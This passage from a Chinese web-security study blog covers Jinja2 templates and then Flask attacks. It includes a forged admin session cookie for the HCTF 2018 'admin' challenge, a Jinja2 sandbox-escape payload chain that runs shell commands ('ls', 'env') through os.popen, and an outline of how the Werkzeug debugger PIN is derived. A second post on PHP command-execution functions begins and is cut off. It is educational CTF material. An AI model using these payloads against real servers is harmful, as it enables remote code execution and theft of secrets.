class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>子模版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;base.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;About Us&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &lt;p&gt;About Us Page Content&lt;/p&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>在子模板中，通过{ % extends ‘base.html’ % }指定继承的主模板，然后使用{ % block % }语法重写主模板中相应的块。</p><h3 id="包含模板"><a href="#包含模板" class="headerlink" title="包含模板"></a>包含模板</h3><p>使用 { % include % }来包含其他模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include &quot;head.html&quot; %&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>过滤器相当于是一个函数，把当前变量传入到过滤器中，然后过滤器根据自己的功能，再返回相应的值，之后再将结果渲染到页面中</p><table><thead><tr><th align="center">过滤器名称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">length</td><td align="center">返回长度</td></tr><tr><td align="center">safe</td><td align="center">禁用转义，默认一些符号会被转义成html编码，禁用后则不转义</td></tr><tr><td align="center">capitialize</td><td align="center">把值的首字母转换成大写，其他子母转换为小写</td></tr><tr><td align="center">lower</td><td align="center">把值转换成小写形式</td></tr><tr><td align="center">upper</td><td align="center">把值转换成大写形式</td></tr><tr><td align="center">title</td><td align="center">把值中每个单词的首字母都转换成大写</td></tr><tr><td align="center">reverse</td><td align="center">将值反转</td></tr><tr><td align="center">format</td><td align="center">格式化，例：{ {‘%s is %d’ | format(‘abc’,11)} }</td></tr><tr><td align="center">truncate</td><td align="center">字符串截断，例：{ {‘hello word’ | truncate(5)} }</td></tr><tr><td align="center">trim</td><td align="center">把值的首尾空格去掉</td></tr><tr><td align="center">striptags</td><td align="center">渲染之前把值中所有的HTML标签都删掉</td></tr><tr><td align="center">join</td><td align="center">拼接多个值为字符串</td></tr><tr><td align="center">replace</td><td align="center">替换字符串的值</td></tr><tr><td align="center">round</td><td align="center">默认对数字进行四舍五入，也可以用参数进行控制</td></tr><tr><td align="center">int</td><td align="center">把值转换成整型</td></tr><tr><td align="center">sum</td><td align="center">求和，列表求和，要求参数为整型</td></tr><tr><td align="center">sort</td><td align="center">排序，列表排序，要求参数为整型</td></tr></tbody></table><h3 id="单个过滤器"><a href="#单个过滤器" class="headerlink" title="单个过滤器"></a>单个过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名|过滤器 &#125;&#125;</span><br><span class="line">&#123;&#123; name|length &#125;&#125;;</span><br></pre></td></tr></table></figure><h3 id="带参数的过滤器"><a href="#带参数的过滤器" class="headerlink" title="带参数的过滤器"></a>带参数的过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名|过滤器(*args) &#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;%s is %d&#x27; | format(&#x27;abc&#x27;, 11) &#125;&#125;</span><br><span class="line">输出：abc is 11</span><br></pre></td></tr></table></figure><h3 id="多个过滤器"><a href="#多个过滤器" class="headerlink" title="多个过滤器"></a>多个过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; 变量名|过滤器|过滤器 &#125;&#125;</span><br><span class="line">首先应用第一个过滤器，然后将结果传递给下一个过滤器</span><br></pre></td></tr></table></figure><h1 id="关于Flask的漏洞"><a href="#关于Flask的漏洞" class="headerlink" title="关于Flask的漏洞"></a>关于Flask的漏洞</h1><h2 id="Flask-Session伪造"><a href="#Flask-Session伪造" class="headerlink" title="Flask Session伪造"></a>Flask Session伪造</h2><p>Session（会话），我记得在学习php时也用到过，相当于用户登陆后，需要有一个标识来记住用户，这个类似于标识的东西就储存在session里面，实则是一个分辨不同用户的东西</p><p>对于Flask的Session使用base64编码形式进行储存，我们可以在登陆后的客户端看到自己的session；在生成Session时，Flask中的app.config[‘SECRET_KEY’]中的值会对Session进行处理，以至于我们只能读看但不能修改，但当key泄露后我们就可以更改内容，比如把用户改为admin以达到越权操作</p><p>综上所述，这个key值成为了关键</p><p><img src="/undefined/bf39/10.png" alt="image-20240408193427424"></p><p>当源码泄露后我们可以在config.py中找到</p><p>当存在任意文件读取漏洞时，我们可以通过读取&#x2F;proc&#x2F;self&#x2F;maps来获取堆栈分布（获取当前进程的内存映射信息，以便了解程序的堆栈布局和内存地址分布。<strong>通过了解内存映射的情况，攻击者可以更好地定位和识别会话密）在内存中的位置</strong>，咋觉得有点像pwn啊），而后读取&#x2F;proc&#x2F;self&#x2F;mem（<strong>获取进程的内存镜像</strong>），通过正则匹配筛选出我们需要的key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为      用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）</span><br><span class="line"></span><br><span class="line">/proc/self</span><br><span class="line">proc是一个伪文件系统，它提供了内核数据结构的接口。内核数据是在程序运行时存储在内部半导体存储器中数据。通过/proc/PID可以访问对应PID的进程内核数据，而/proc/self访问的是当前进程的内核数据。</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline</span><br><span class="line">该文件包含的内容为当前进程执行的命令行参数。</span><br><span class="line"></span><br><span class="line">/proc/self/mem</span><br><span class="line">/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。</span><br><span class="line"></span><br><span class="line">/proc/self/maps</span><br><span class="line">/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。</span><br></pre></td></tr></table></figure><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>让我们用一道题目来看看</p><p><img src="/undefined/bf39/11.png" alt="image-20240408200348790"></p><p>这道题我上一次做是用Unicode欺骗方法来做的，这一次我们用session伪造试一下，现在我已经注册了一个账号</p><p><img src="/undefined/bf39/12.png" alt="image-20240408200742295"></p><p>源代码中我们看到提示，说明存在管理员账户，在更改密码中我们又看到</p><p><img src="/undefined/bf39/13.png" alt="image-20240408201346829"></p><p>这里我们找到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>现在我们有了key我们可以通过登录成功的session去解密得到明文，然后把用户名改为admin再进行加密得到admin的session值</p><p><img src="/undefined/bf39/14.png" alt="image-20240408202255641"></p><p><img src="/undefined/bf39/15.png" alt="image-20240408203316314"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;7f0d7fec719ae3c7986b5d1228300f62f4acca4b8f48ab85c18a6a32ae440eb46064667fd4bff17bb73d3704f2ff652f3e3e6625dce2dc44ed9c7ae30a884d98&#x27;, &#x27;csrf_token&#x27;: b&#x27;84d24a1b22750c5878458d1c83286732ef28b7d5&#x27;, &#x27;image&#x27;: b&#x27;1oPg&#x27;, &#x27;name&#x27;: &#x27;quar&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>将name改为admin</p><p><img src="/undefined/bf39/16.png" alt="image-20240408203430367"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kMGKwjAQQH9lydlDm-1lBS9LarAwUyqtZXIRt61NE-NCVbqN-O-bdcHrPObxZu5sfxy7i2bL63jrFmw_tGx5Z29fbMmQ06RE61QN71CetCrRoLcJuk2sRDqD6T2IT4cmcyjXhngakdEOhdZk-ph8mlCpNPgs7BYRyN2AgiY0BUcTvGI7KEc_yLMBPVrwzYSS5jDjWGYOeOVVSRzMzhKvZiUhQrmzeeihuvIg0yQXW5uX_Yo9Fqy5jMf99dt259cJfxjMVkO9CblNDBLiXDQJiipRYm1yAXMu6D0knpTZJGRai8XqqRvcoe9eJqg_CjX9k_PBBcAOrRvObMFul258_o3FEXv8Aqi4bO0.ZhPkTg.iYnRspRb9-xhO7RWeLXeaKuTA-s</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/17.png" alt="image-20240408203506055"></p><h2 id="Flask-SSTI服务器端模板注入漏洞"><a href="#Flask-SSTI服务器端模板注入漏洞" class="headerlink" title="Flask SSTI服务器端模板注入漏洞"></a>Flask SSTI服务器端模板注入漏洞</h2><p>我们在初识Flask中讲到很多基于Jinja2模板引擎中的模板语法，其中的变量是由用户控制的，但如果未正确过滤或处理用户提供的模板数据，允许攻击者通过在模板中注入恶意代码来执行任意代码，则可能导致敏感信息泄露、服务器端代码执行、甚至完全接管服务器</p><p>对于模板，开发者的目的肯定是让用户更好的传递数据，当然，如果现在不是这个目的，那么服务器端模板注入漏洞就会出现</p><h3 id="确定是否存在模板注入"><a href="#确定是否存在模板注入" class="headerlink" title="确定是否存在模板注入"></a>确定是否存在模板注入</h3><p>我们来看两个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">    html_str = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;&#123;str&#125;&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str,<span class="built_in">str</span>=<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods = [<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">str</span> = request.args.get(<span class="string">&#x27;v&#x27;</span>)</span><br><span class="line">    html_str = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br></pre></td></tr></table></figure><p>第一个代码会被先渲染然后在return时模板引擎会将<code>&#123;&#123;str&#125;&#125;</code>替换为<code>str</code>变量的值，第二个代码直接将用户传入的参数值放入html_str中，然后经过模板渲染，直接输出显然这会造成恶意命令输入</p><p><img src="/undefined/bf39/Users\23800\AppData\Roaming\Typora\typora-user-images\image-20240408212738405.png" alt="image-20240408212738405"></p><p>造成信息泄露</p><p>所以我们在检测是否存在SSTI时可以用数学运算来测验一下<img src="/undefined/bf39/18.png" alt="image-20240408213626676"></p><p>这是第一个代码下的web网页，此时整体被当作一个数据，而第二个代码则会算出结果</p><h3 id="确定模板引擎"><a href="#确定模板引擎" class="headerlink" title="确定模板引擎"></a>确定模板引擎</h3><p>各个模板引擎的语法是会有差异的，这些语法是专门为不与HTML字符冲突而选择的。有时无效的语法会返回错误信息，其中包含引擎类型或者版本（若遇到返回，搜索一下即可判断）</p><p>当然除此之外，我们以及可以注入数学运算来确定</p><p>Twig、Jinja2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; var1 + var2 &#125;&#125;</span><br></pre></td></tr></table></figure><p>Mako</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123; var1 + var2 &#125;</span><br></pre></td></tr></table></figure><h3 id="Python沙盒逃逸（魔术方法）"><a href="#Python沙盒逃逸（魔术方法）" class="headerlink" title="Python沙盒逃逸（魔术方法）"></a>Python沙盒逃逸（魔术方法）</h3><p>在Jinja2中可以访问到Python的内置变量并且可以调用对应变量类型</p><p>Python的特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__class__ # 查找当前类型的所属对象</span><br><span class="line">__mro__ # 查找当前类对象的所有继承类</span><br><span class="line">__subclasses__ # 查找父类下的所有子类</span><br><span class="line">__globals__ # 函数会议字典的形式返回当前对象的全部全局变量</span><br><span class="line">__init__ # 查看类是否重载，重载是指程序在运行是就已经加载好了这个模块到内存中，如果出现wrapper字眼，说明没有重载</span><br><span class="line">__base__ # 沿着父子类的关系往上走一个</span><br><span class="line"></span><br><span class="line">_builtin_ 内建函数，python中可以直接运行一些函数，例如int(),list()等等，这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)</span><br><span class="line"></span><br><span class="line"> ps：在py3中__builtin__被换成了builtin </span><br><span class="line"> __builtin__ 和 __builtins__之间是什么关系呢？</span><br><span class="line">在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。</span><br><span class="line">非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身</span><br></pre></td></tr></table></figure><p>基本的思路就是通过找到合适的魔术方法，一步步去执行，从而得到我们想要的结果（确实挺沙盒的）</p><p>这里提到了父类和子类，在Python中，可以使用类和继承来构建父类和子类的关系。父类是指在继承关系中被继承的类，而子类则是指继承父类的类。<strong>一个子类可以继承其父类的属性和方法，并且可以扩展或修改这些属性和方法。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_sound</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_sound</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Woof!&quot;</span></span><br><span class="line"></span><br><span class="line">dog = Dog(<span class="string">&quot;Buddy&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(dog.name)  <span class="comment"># 输出：Buddy</span></span><br><span class="line"><span class="built_in">print</span>(dog.make_sound())  <span class="comment"># 输出：Woof!</span></span><br></pre></td></tr></table></figure><p>一眼丁真，这个例子非常清晰</p><p>我们来看看基本输入语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__</span><br><span class="line">#&#x27;&#x27;表示一个空字符串，&#x27;&#x27;.__class__将返回空字符串对象的类，即&lt;class &#x27;str&#x27;&gt;，表示字符串类</span><br><span class="line"></span><br><span class="line">[].__class__ 返回的是空列表对象的类，即 &lt;class &#x27;list&#x27;&gt;，表示列表类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/19.png" alt="image-20240408233020140"></p><p>寻找基类</p><p><img src="/undefined/bf39/20.png" alt="image-20240408233126369"></p><p>两者都可以</p><p><strong>注：object是父子关系的顶端，所有的数据类型最终的父类都是object</strong></p><h4 id="常用payload及绕过"><a href="#常用payload及绕过" class="headerlink" title="常用payload及绕过"></a>常用payload及绕过</h4><p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">SSTI入门详解-CSDN博客</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">获取基本类的所有子类</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()</span><br><span class="line">读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用（python2）</span><br></pre></td></tr></table></figure><p>更多的我认为应根据题目来理解，这里我没完全搞明白就不写下去了，贴了链接来辅助理解</p><p>所以来道小题消化一下</p><h3 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h3><p>从源码中我看到变量是name，我们以此来构建payload</p><p>按照步骤，还是一样我们先用数学计算来检测是否存在注入</p><p><img src="/undefined/bf39/21.png" alt="image-20240409001931474"></p><p>很好</p><p><img src="/undefined/bf39/22.png" alt="image-20240409002745117"></p><p>通过class找到当前类</p><p><img src="/undefined/bf39/23.png" alt="image-20240409002824857"></p><p>找到基类</p><p><img src="/undefined/bf39/24.png" alt="image-20240409002101480"></p><p>源代码中我们找到很多子类</p><p>这里我们无法直接读取文件，因为不知道目标目录，所以我们要通过system函数去ls，这里就要通过调用os模块<strong>（在Python中，<code>os</code>模块是用于与操作系统进行交互的模块）</strong>以达到system的效果</p><p>此时我们用到子类80</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27%27.__class__.__base__.__subclasses__()[80]</span><br></pre></td></tr></table></figure><p>返回：&lt;class ‘_frozen_importlib_external._NamespacePath’&gt;</p><p>在Python中，命名空间路径（NamespacePath）是一种机制，用于管理模块的导入和查找。它帮助Python解释器定位并加载模块，从而使程序能够使用模块中定义的函数、类和变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[80].__init__.__globals__ =&gt; __globals__</span><br></pre></td></tr></table></figure><p>__globals__是函数中的一个内置属性，以字典的形式返回当前空间的全局变量，而其中就能找到我们需要的目标模块”<strong>builtins</strong>“</p><p><img src="/undefined/bf39/25.png" alt="image-20240409011637885"></p><p>然而，并不是每个类的__init__都拥有__globals__属性，所以我们寻找的合适的类实际上就是__init__中拥有__globals__属性的类，可以通过脚本去遍历</p><p><img src="/undefined/bf39/26.png" alt="image-20240409005841270"></p><p>看来也并非一定是子类80，我们只是要的模块”<strong>builtins</strong>“来执行命令，至于是哪个子类就无所谓了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtins个模块中有很多我们常用的内置函数和类，其中就有eval函数</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/27.png" alt="image-20240409012144463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span><br></pre></td></tr></table></figure><p><code>__import__</code>: 加载 os 模块。<br><code>popen()</code>: 执行一个 shell 以运行命令来开启一个进程，最后加个 <code>read()</code> 函数读取回显内容</p><p><img src="/undefined/bf39/28.png" alt="image-20240409012644666"></p><p>然而这里并没有flag，看了wp发现是再环境变量里，这我怎么都想不到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%27%27.__class__.__base__.__subclasses__()[80].__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27env%27).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/undefined/bf39/29.png" alt="image-20240409013224203"></p><p>总结：这个SSTI够喝两壶的了。。。。。。</p><h2 id="Flask-PIN"><a href="#Flask-PIN" class="headerlink" title="Flask PIN"></a>Flask PIN</h2><p>Flask PIN码是一种安全措施，用于防止未授权访问Flask应用的调试器。当Flask应用以<strong>调试模式</strong>（Debug）运行时，PIN码可以作为一种保护机制，确保只有知道PIN码的用户才能访问交互式调试器。这是通过Werkzeug库实现的，Werkzeug是Flask的一个依赖项。</p><p>PIN码的生成依赖于多个因素，包括但不限于当前运行应用的<strong>用户名称（username）、应用的模块名（modname）、应用的名称（appname）、应用模块的文件路径（moddir）、当前网络接口的MAC地址的十进制数、UUID节点和机器ID</strong>。这些值通过特定的算法组合并进行哈希处理，生成一个9位的PIN码。</p><p>值得注意的是，PIN码并不是完全随机生成的，当同一程序重复运行时，生成的PIN码是相同的。但是，PIN码的生成算法可能会随着Werkzeug和Flask的不同版本而有所变化。例如，<strong>在Python 3.6版本中可能使用MD5加密算法，而在Python 3.8版本中可能使用SHA1加密算法。</strong></p><p>尽管PIN码提供了一定的安全层，但在生产环境中仍然不建议使用调试模式，因为错误的堆栈跟踪可能会暴露敏感信息。此外，如果攻击者能够访问到应用的调试器，他们可能尝试猜测或暴力破解PIN码。因此，开发人员应确保在生产环境中关闭调试模式，或者使用其他更安全的调试工具。</p><p>获取Flask PIN码的脚本底层逻辑基于对Flask和Werkzeug内部PIN码生成机制的理解。这个机制涉及到多个系统和应用级别的信息，这些信息被用来生成一个特定的哈希值，即PIN码。以下是获取PIN码的底层逻辑的关键步骤：</p><ol><li><p><strong>收集关键信息</strong>：脚本首先需要收集一系列关键信息，这些信息包括：</p><ul><li>当前运行应用的用户名（通常通过<code>getpass.getuser()</code>或读取<code>/etc/passwd</code>文件获得）。</li><li>应用的模块名（默认为<code>flask.app</code>）。</li><li>应用的名称（默认为<code>Flask</code>）。</li><li>Flask应用模块文件的路径（例如<code>/usr/local/lib/pythonX.X/site-packages/flask/app.py</code>）。</li><li>网络接口的MAC地址（通过读取<code>/sys/class/net/ethX/address</code>获得）。</li><li>系统的唯一标识符，即机器ID（可以通过多种方式获取，如<code>/etc/machine-id</code>、<code>/proc/sys/kernel/random/boot_id</code>等）。</li></ul></li><li><p><strong>哈希处理</strong>：收集到的信息被用作输入，通过特定的哈希算法（如MD5或SHA1）进行处理。这些信息被编码为字节串（如果它们是字符串），然后更新到哈希对象中。</p></li><li><p><strong>生成PIN码</strong>：哈希值用于生成PIN码。通常，哈希值的最后几位会被截取并格式化为9位数字（如果需要的话）。这个数字就是PIN码。</p></li><li><p><strong>考虑环境因素</strong>：在不同的环境下，如Docker容器，可能会有不同的机器ID获取方式。脚本需要根据当前环境调整获取机器ID的逻辑。</p></li><li><p><strong>版本兼容性</strong>：由于PIN码生成算法可能随着Werkzeug和Flask版本的不同而变化，脚本可能需要根据目标应用使用的版本来调整算法。</p></li><li><p><strong>输出PIN码</strong>：最终，脚本输出计算得到的PIN码，供用户在Flask调试器中使用。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行&amp;代码执行（完善中...）</title>
      <link href="/undefined/46b9/"/>
      <url>/undefined/46b9/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行-代码执行"><a href="#命令执行-代码执行" class="headerlink" title="命令执行&amp;代码执行"></a>命令执行&amp;代码执行</h1><p>命令执行（RCE）漏洞和代码执行漏洞区别如下:</p><ul><li>命令执行则是调用操作系统命令进行执行</li><li>代码执行实际上是调用服务器网站代码进行执行</li></ul><h2 id="命令执行漏洞（RCE）"><a href="#命令执行漏洞（RCE）" class="headerlink" title="命令执行漏洞（RCE）"></a>命令执行漏洞（RCE）</h2><p>当开发人员调用了执行系统命令的函数，而其中的函数参数用户可以控制，届时就有了利用机会</p><h3 id="1-代码层过滤不严格"><a href="#1-代码层过滤不严格" class="headerlink" title="1.代码层过滤不严格"></a>1.代码层过滤不严格</h3><p>调用的第三方组件存在代码执行漏洞常见的命令执行函数</p><ul><li>PHP：exec、shell_exec、system、passthru、popen、proc_open等</li><li>Java：Runtime.exec(String command)、ProcessBuilder(String… command)、ProcessBuilder.Redirect、ProcessBuilder.start()等</li></ul><p>这里有几个常用的系统命令执行函数（PHP）</p><p><strong>exec()：</strong></p><p>执行外部程序，但只返回<strong>最后一行</strong>的输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">bool exec(string $command,array $output,int $return_var)</span><br><span class="line">（必需）$command: 要执行的命令</span><br><span class="line">$output: 一个引用数组，用于存储命令的输出</span><br><span class="line">$return_var: 一个引用变量，用于存储命令的退出状态</span><br><span class="line">（如果外部程序成功执行，返回 0；如果执行失败，返回一个非 0 的值）</span><br></pre></td></tr></table></figure><p><strong>system()：</strong></p><p>执行外部程序并显示输出结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">string system(string $command, int $return_var, array $output)</span><br><span class="line">（必需）$command: 要执行的命令</span><br><span class="line">$return_var: 一个引用变量，用于存储命令的退出状态</span><br><span class="line">$output: 一个引用数组，用于存储命令的输出，这个参数是 PHP 5.0.0 以上版本的扩展参数，用于捕获命令的输出</span><br></pre></td></tr></table></figure><p><strong>shell_exec()：</strong></p><p>执行一个通过 shell 调用的命令，并将完整的输出捕获为字符串返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">函数原型</span><br><span class="line">string shell_exec(string $command)</span><br><span class="line">$command: 要执行的命令，如果命令执行失败或者命令没有输出，返回 